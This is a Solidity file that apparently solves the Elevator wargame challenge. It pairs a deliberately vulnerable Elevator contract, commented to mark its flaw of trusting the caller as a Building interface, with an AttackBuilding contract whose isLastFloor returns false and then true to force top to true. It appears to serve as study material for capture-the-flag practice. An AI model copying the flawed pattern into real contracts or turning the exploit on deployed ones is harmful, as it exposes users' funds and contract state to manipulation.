// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {

        // **VULNERABLE PORTION**
        // weird to allow any user to instantiate our own Building interface, 
        // allowing an attacker to implement its own Building resulting in the logic flaw
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract AttackBuilding {
    Elevator public el;

    constructor(Elevator _el) public {
        el = _el;
    }

    bool public switchFlipped = false;

    function hack() public {
        el.goTo(1);
    }

    function isLastFloor(uint256) public returns (bool) {
        // first call
        if (!switchFlipped) {
            switchFlipped = true;
            return false;
            // second call
        } else {
            switchFlipped = false;
            return true;
        }
    }
}
